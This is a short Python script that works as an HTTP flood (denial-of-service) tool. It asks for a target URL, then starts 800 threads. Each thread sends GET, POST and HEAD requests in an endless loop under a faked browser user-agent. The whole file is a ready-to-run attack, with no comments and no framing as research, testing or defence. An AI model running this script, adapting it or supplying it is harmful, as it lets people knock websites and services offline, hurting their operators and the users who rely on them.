import requests 
from threading import Thread
import random

users = [
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
]
headers = {
	'User-Agent' : random.choice(users)
}
url = input("url:")
def send():
	while True:
		requests.get(url, headers=headers)
		print("Get...")
		requests.post(url, headers=headers)
		print("post...")
		requests.head(url, headers=headers)
		print("head...")

if __name__ == '__main__':
	for i in range (800):
		thr = Thread(target=send)
		thr.start()
